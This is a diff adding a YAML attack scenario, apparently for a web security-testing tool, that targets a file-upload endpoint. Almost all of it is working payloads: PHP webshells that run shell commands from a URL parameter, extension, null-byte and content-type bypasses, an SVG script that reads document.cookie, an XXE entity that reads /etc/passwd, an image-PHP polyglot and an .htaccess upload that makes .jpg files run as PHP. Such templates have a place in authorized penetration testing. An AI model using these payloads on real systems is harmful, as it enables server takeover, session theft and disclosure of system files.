@@ -1,0 +1,111 @@
+name: file_upload
+description: File upload bypass and exploitation attacks
+
+variables:
+  upload_endpoint: /api/upload
+  allowed_types: ["jpg", "png", "gif"]
+
+steps:
+  - name: get_upload_form
+    request:
+      method: GET
+      url: ${upload_endpoint}
+    extract:
+      csrf_token: "regex:csrf[_-]?token[\"']?\\s*[=:]\\s*[\"']?([^\"'\\s>]+)"
+      upload_action: "regex:action=[\"']([^\"']+)"
+    expect:
+      status: 200
+    optional: true
+
+  - name: upload_image
+    request:
+      method: POST
+      url: ${upload_endpoint}
+      headers:
+        Content-Type: multipart/form-data
+      multipart:
+        file:
+          filename: test.jpg
+          content_type: image/jpeg
+          content: "FFD8FFE000104A464946"
+        csrf_token: "${csrf_token}"
+    extract:
+      file_url: $.url
+      file_id: $.id
+    expect:
+      status: [200, 201]
+
+attacks:
+  - name: php_webshell
+    description: Upload PHP webshell
+    type: webshell_upload
+    modify_step: upload_image
+    modifications:
+      multipart.file.filename: "shell.php"
+      multipart.file.content_type: "image/jpeg"
+      multipart.file.content: "<?php system($_GET['cmd']); ?>"
+    verify:
+      - request:
+          method: GET
+          url: "${file_url}?cmd=id"
+        expect:
+          body_contains: "uid="
+
+  - name: double_extension
+    description: Double extension bypass
+    type: extension_bypass
+    modify_step: upload_image
+    modifications:
+      multipart.file.filename: "shell.php.jpg"
+      multipart.file.content: "<?php system($_GET['c']); ?>"
+
+  - name: null_byte_bypass
+    description: Null byte extension bypass
+    type: null_byte_bypass
+    modify_step: upload_image
+    modifications:
+      multipart.file.filename: "shell.php%00.jpg"
+      multipart.file.content: "<?php phpinfo(); ?>"
+
+  - name: content_type_bypass
+    description: Bypass via content-type manipulation
+    type: content_type_bypass
+    modify_step: upload_image
+    modifications:
+      multipart.file.filename: "shell.phtml"
+      multipart.file.content_type: "image/gif"
+      multipart.file.content: "GIF89a<?php system($_GET['x']); ?>"
+
+  - name: svg_xss
+    description: SVG with embedded XSS
+    type: stored_xss
+    modify_step: upload_image
+    modifications:
+      multipart.file.filename: "xss.svg"
+      multipart.file.content_type: "image/svg+xml"
+      multipart.file.content: "<svg xmlns='http://www.w3.org/2000/svg'><script>alert(document.cookie)</script></svg>"
+
+  - name: xxe_svg
+    description: XXE via SVG upload
+    type: xxe
+    modify_step: upload_image
+    modifications:
+      multipart.file.filename: "xxe.svg"
+      multipart.file.content_type: "image/svg+xml"
+      multipart.file.content: "<?xml version='1.0'?><!DOCTYPE svg [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><svg>&xxe;</svg>"
+
+  - name: polyglot_upload
+    description: Polyglot file (valid image + PHP)
+    type: polyglot_bypass
+    modify_step: upload_image
+    modifications:
+      multipart.file.filename: "polyglot.php.jpg"
+      multipart.file.content: "FFD8FFE0<?php system($_GET['c']); __halt_compiler(); ?>"
+
+  - name: htaccess_upload
+    description: Upload .htaccess for code execution
+    type: htaccess_bypass
+    modify_step: upload_image
+    modifications:
+      multipart.file.filename: ".htaccess"
+      multipart.file.content: "AddType application/x-httpd-php .jpg"
